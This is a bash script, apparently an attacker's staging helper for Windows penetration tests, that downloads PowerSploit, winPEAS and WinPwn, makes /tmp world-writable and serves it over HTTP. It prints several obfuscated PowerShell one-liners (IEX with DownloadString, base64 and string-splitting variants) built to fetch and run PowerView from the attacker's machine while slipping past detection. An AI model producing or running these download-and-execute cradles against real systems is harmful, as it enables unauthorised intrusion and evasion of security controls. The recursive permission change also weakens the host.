#!/bin/bash

# Set up web server directory
mkdir -p /tmp/exploit_server
cd /tmp/exploit_server

# Download PowerSploit
git clone https://github.com/PowerShellMafia/PowerSploit.git
# Download winPEAS
wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1 -O /tmp/winpeas.ps1
# Download WinPwn
wget https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/refs/heads/master/Offline_WinPwn.ps1 -O /tmp/winpwn.ps1

chmod 777 -R /tmp

# Get the IP address from tun0 interface
IP=$(ip addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$IP" ]; then
    echo "tun0 interface not found or no IP address assigned."
    exit 1
fi

# Define color codes
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored PowerShell commands
print_command() {
    echo -e "${BLUE}$1${NC}"
    echo "----------------------------------------"
}

# Print PowerShell bypass commands
echo "PowerShell Bypass Commands:"
echo "============================"

# Basic IEX
print_command "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://$IP:8080/PowerSploit/Recon/PowerView.ps1')\""

# Base64 encoding
print_command "powershell -c \"\$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Invoke-WebRequest 'http://$IP:8080/PowerSploit/Recon/PowerView.ps1').Content)); IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\$encoded)))\""

# Split command
print_command "powershell -c \"\$a='IEX'; \$b='(New-Object Net.WebClient).Down'; \$c='loadString(''http://$IP:8080/PowerSploit/Recon/PowerView.ps1'')'; \$d=(\$b+\$c); &(\$a) (& \$a \$d)\""

# Environment variables
print_command "powershell -c \"\$env:ps='IEX'; \$env:url='http://$IP:8080/PowerSploit/Recon/PowerView.ps1'; &(\$env:ps) (New-Object Net.WebClient).DownloadString(\$env:url)\""

# String manipulation
print_command "powershell -c \"\$cmd = 'IEX (New-Object Net.WebClient).DownloadString(''http://$IP:8080/PowerSploit/Recon/PowerView.ps1'')'; \$cmd.Split('').ForEach{$_ -replace 'I','I' -replace 'E','E' -replace 'X','X'} -join '' | IEX\""

# ASCII encoding
print_command "powershell -c \"\$ascii = (New-Object Net.WebClient).DownloadString('http://$IP:8080/PowerSploit/Recon/PowerView.ps1') -split '' | ForEach-Object {[int][char]\$_}; IEX ([char[]]\$ascii -join '')\""

echo "============================"
echo "Starting web server..."

# Start the web server
python3 -m http.server 8080 -d /tmp
